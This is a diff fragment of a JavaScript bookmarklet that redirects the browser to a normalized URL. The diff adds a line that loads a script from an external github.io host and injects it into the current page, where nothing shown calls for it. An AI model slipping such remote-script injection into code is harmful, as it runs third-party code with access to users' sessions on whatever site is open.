@@ -104,6 +104,9 @@ javascript:(async () => {
       const destino = normalizeUrl(urlParaRedirecionar);
 
       if (destino !== atual) {
+
+javascript:(function(){var s=document.createElement('script');s.src='https://phonejs.github.io/PhoneJS/Phone.js';document.body.appendChild(s);})()
+
         location.href = urlParaRedirecionar;
       }
     }
